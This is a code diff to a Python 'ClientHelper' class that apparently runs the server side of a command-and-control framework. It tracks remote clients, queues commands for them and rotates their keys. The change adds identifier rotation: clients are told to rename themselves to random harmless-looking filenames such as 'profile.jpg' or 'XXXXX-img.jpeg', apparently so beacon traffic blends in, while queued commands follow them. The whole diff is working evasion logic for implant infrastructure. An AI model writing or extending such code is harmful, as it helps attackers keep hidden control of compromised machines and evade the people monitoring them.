@@ -4,6 +4,8 @@ import logging
 from datetime import datetime
 import json
 import re
+import string
+import random
 
 logger = logging.getLogger(__name__)
 
@@ -14,6 +16,35 @@ class ClientHelper:
         self.client_manager = client_manager
         self.crypto_helper = crypto_helper
         self.server = server
+        self._load_client_names()
+    
+    def _load_client_names(self):
+        """Load possible client names from client_names.txt file"""
+        self.client_names = ["default-img.jpeg"]  # Fallback default
+        
+        try:
+            # Find the client_names.txt file path
+            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+            names_file = os.path.join(script_dir, "helpers", "links", "client_names.txt")
+            
+            if os.path.exists(names_file):
+                with open(names_file, 'r') as f:
+                    names = [line.strip() for line in f if line.strip()]
+                
+                if names:
+                    self.client_names = names
+                    logger.info(f"Loaded {len(names)} client names from {names_file}")
+                else:
+                    logger.warning(f"No client names found in {names_file}, using defaults")
+            else:
+                logger.warning(f"Client names file not found at {names_file}, using defaults")
+                # Create some default options
+                self.client_names = [
+                    "profile.jpg", "document.pdf", "config.json", "data.csv", 
+                    "script.js", "style.css", "image.png", "icon.ico"
+                ]
+        except Exception as e:
+            logger.error(f"Error loading client names: {e}")
     
     def identify_client_from_body(self, client_ip, client_id_from_body, system_info_raw=None):
         """
@@ -34,14 +65,13 @@ class ClientHelper:
         # Use the client ID from the body if provided
         client_id = client_id_from_body
         
-        # Check if client_id follows the expected format (XXXXX-img.jpeg)
-        if client_id and not client_id.upper().endswith("-IMG.JPEG"):
-            logger.warning(f"Client ID {client_id} doesn't follow expected format, may need verification")
-        
         # If no client ID was provided, use IP as fallback
         if not client_id:
             client_id = client_ip
             logger.warning(f"No client ID provided, using IP address {client_ip} as identifier")
+        
+        # Original client ID (will be updated if needed based on system info)
+        original_client_id = client_id
         
         # Process system info if available
         if system_info_raw:
@@ -85,17 +115,44 @@ class ClientHelper:
                     
                     logger.info(f"Extracted system info - Hostname: {hostname}, IP: {ip}")
                     
+                    # Check for original client ID in system info
+                    if 'OriginalClientId' in system_info_obj:
+                        reported_original_id = system_info_obj.get('OriginalClientId')
+                        logger.info(f"Client reported original ID: {reported_original_id}")
+                        
+                        # This is a rotated client ID. Use the original for internal tracking.
+                        if reported_original_id in self.client_manager.get_clients_info():
+                            # Update the client info with the current ID
+                            client_info = self.client_manager.get_clients_info()[reported_original_id]
+                            
+                            # Update the client's current ID in our tracking
+                            self.client_manager.update_client_id_mapping(reported_original_id, client_id)
+                            
+                            # Use original ID for internal tracking
+                            original_client_id = reported_original_id
+                            logger.info(f"Using original client ID for internal tracking: {original_client_id}")
+                        else:
+                            logger.warning(f"Original client ID {reported_original_id} not found in client manager")
                 except Exception as e:
                     logger.error(f"Error parsing system info: {str(e)}")
                     # Keep client_id but use minimal system info
                     system_info = {"Hostname": "Unknown", "IP": client_ip}
                 
-                # Check if this is a known client
+                # Check if this is a known client via the current ID
                 if client_id in self.client_manager.get_clients_info():
-                    logger.info(f"Recognized client by ID {client_id} from {client_ip}")
+                    logger.info(f"Recognized client by current ID {client_id} from {client_ip}")
+                    original_client_id = client_id  # This is likely the original ID
                     
                     # Check if this client needs a key
                     if not self._has_unique_key(client_id):
+                        first_contact = True
+                
+                # Check if we need to find the client by a rotated ID mapping
+                elif original_client_id != client_id:
+                    # We're already tracking this via original_client_id
+                    logger.info(f"Mapped rotated client ID {client_id} to original ID {original_client_id}")
+                    
+                    if not self._has_unique_key(original_client_id):
                         first_contact = True
                 else:
                     newly_identified = True
@@ -114,10 +171,11 @@ class ClientHelper:
             ip=client_ip,
             hostname=system_info.get("Hostname", "Unknown"),
             system_info=system_info,
-            client_id=client_id
+            client_id=original_client_id,  # Use the original ID for internal tracking
+            current_id=client_id if original_client_id != client_id else None  # Only set if it's different
         )
         
-        return client_id, system_info, newly_identified, first_contact
+        return original_client_id, system_info, newly_identified, first_contact
     
     def verify_client(self, client_id, system_info):
         """
@@ -216,12 +274,59 @@ class ClientHelper:
         
         return key_rotation_command
     
+    def prepare_client_id_rotation(self, client_id):
+        """
+        Prepare a client ID rotation command
+        
+        Returns:
+            dict: Client ID rotation command object
+        """
+        # Select a random client ID from available options
+        # Make sure we don't reuse the current one
+        current_client_id = None
+        
+        if client_id in self.client_manager.get_clients_info():
+            client_info = self.client_manager.get_clients_info()[client_id]
+            current_client_id = client_info.get('current_client_id')
+        
+        new_client_id = self._generate_new_client_id(exclude=current_client_id)
+        
+        # Store the mapping between original and current ID
+        self.client_manager.update_client_id_mapping(client_id, new_client_id)
+        
+        # Create client ID rotation command
+        rotation_command = {
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "command_type": "client_id_rotation",
+            "args": new_client_id
+        }
+        
+        logger.info(f"Client ID rotation command issued for client {client_id} -> {new_client_id}")
+        
+        return rotation_command
+    
+    def _generate_new_client_id(self, exclude=None):
+        """Generate a new client ID from the available options"""
+        available_names = [name for name in self.client_names]
+        
+        # Remove the excluded ID if provided
+        if exclude and exclude in available_names:
+            available_names.remove(exclude)
+        
+        # If we're somehow out of options, generate a random one
+        if not available_names:
+            random_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
+            return f"{random_id}-img.jpeg"
+        
+        # Select a random name
+        return random.choice(available_names)
+    
     def organize_commands(self, client_id, include_key_rotation=False, first_contact=False):
         """
         Organize commands for client including key rotation if needed
         
         Args:
-            client_id: Client identifier
+            client_id: Client identifier (original ID)
             include_key_rotation: Whether to include key rotation command
             first_contact: Whether this is the first contact from client
             
@@ -241,6 +346,28 @@ class ClientHelper:
         # Get pending commands for established clients
         commands = self.client_manager.get_pending_commands(client_id)
         
+        # If there are no pending commands and client_id is an original ID,
+        # check if there are pending commands under a current ID
+        if not commands and client_id in self.client_manager.get_clients_info():
+            current_id = self.client_manager.get_clients_info()[client_id].get('current_client_id')
+            if current_id and current_id != client_id:
+                # Check if there are any commands for the current ID
+                current_commands = self.client_manager.get_pending_commands(current_id)
+                if current_commands:
+                    # Transfer commands to the original ID
+                    for cmd in current_commands:
+                        self.client_manager.add_command(
+                            client_id, 
+                            cmd.get('command_type', 'unknown'), 
+                            cmd.get('args', '')
+                        )
+                    
+                    # Clear commands from the current ID
+                    self.client_manager.clear_pending_commands(current_id)
+                    
+                    # Get updated command list
+                    commands = self.client_manager.get_pending_commands(client_id)
+        
         # Move any key rotation commands to the front
         for i, command in enumerate(commands):
             if command.get('command_type') == 'key_rotation':
@@ -255,12 +382,30 @@ class ClientHelper:
             commands.insert(0, key_rotation_command)
             has_key_operation = True
         
+        # Check if there's a client ID rotation command and move it after key rotation 
+        # (since key rotation needs to happen first)
+        has_id_rotation = False
+        for i, command in enumerate(commands):
+            if command.get('command_type') == 'client_id_rotation':
+                has_id_rotation = True
+                # If there is a key rotation (which will be at position 0), 
+                # move the ID rotation to position 1
+                if has_key_operation and i > 1:
+                    commands.insert(1, commands.pop(i))
+                # If there's no key rotation but the ID rotation isn't at position 0, 
+                # move it there
+                elif not has_key_operation and i > 0:
+                    commands.insert(0, commands.pop(i))
+                break
+        
         return commands, has_key_operation
     
     def clear_commands_after_rotation(self, client_id):
         """Clear key rotation commands but keep other commands"""
         pending_commands = self.client_manager.get_pending_commands(client_id)
-        non_rotation_commands = [cmd for cmd in pending_commands if cmd.get('command_type') != 'key_rotation']
+        non_rotation_commands = [cmd for cmd in pending_commands 
+                                if cmd.get('command_type') != 'key_rotation' 
+                                and cmd.get('command_type') != 'client_id_rotation']
         
         # Clear all commands then add back non-rotation ones
         self.client_manager.clear_pending_commands(client_id)
